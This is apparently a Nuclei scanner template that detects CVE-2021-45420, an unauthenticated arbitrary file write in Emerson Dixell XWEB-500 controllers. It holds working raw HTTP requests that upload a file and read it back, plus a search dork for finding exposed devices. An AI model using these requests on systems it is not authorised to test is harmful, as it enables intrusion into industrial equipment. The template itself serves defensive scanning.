id: CVE-2021-45420

info:
  name: Emerson Dixell XWEB-500 - Arbitrary File Write
  author: hackerarpan
  severity: critical
  description: |
    Emerson Dixell XWEB-500 contains an arbitrary file write caused by unauthenticated access to /cgi-bin/logo_extra_upload.cgi, /cgi-bin/cal_save.cgi, and /cgi-bin/lo_utils.cgi, letting attackers write any file on the system, exploit requires no authentication.
  impact: |
    Unauthenticated attackers can write arbitrary files to any location on the Dixell XWEB-500 server, potentially uploading malicious CGI scripts or modifying system files.
  remediation: |
    Apply firmware updates provided by Emerson Dixell or restrict network access to the device.
  reference:
    - https://www.exploit-db.com/exploits/50639
    - https://www.swascan.com/emerson
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45420
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-45420
    cwe-id: CWE-200
    epss-score: 0.78704
    epss-percentile: 0.98992
    cpe: cpe:2.3:h:emerson:dixell_xweb-500:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: emerson
    product: dixell_xweb-500
    google-query: inurl:"xweb500.cgi"
  tags: cve,cve2021,lfw,iot,dixell,xweb500,edb,fileupload,intrusive,vkev,vuln

http:
  - raw:
      - |
        POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream

        {{randstr}}.txt
        dixell-xweb500-filewrite
      - |
        GET /logo/{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "dixell-xweb500-filewrite")'

      - type: status
        status:
          - 200
# digest: 4a0a004730450220661226000426cb4cb64193ca2c9490830cee5d76fc98af558fce9d3a0b395eb30221009102c81572f994b5171c9f4b8ea03a440509feb9e53435285c6f4bb628067804:922c64590222798bb761d5b6d8e72950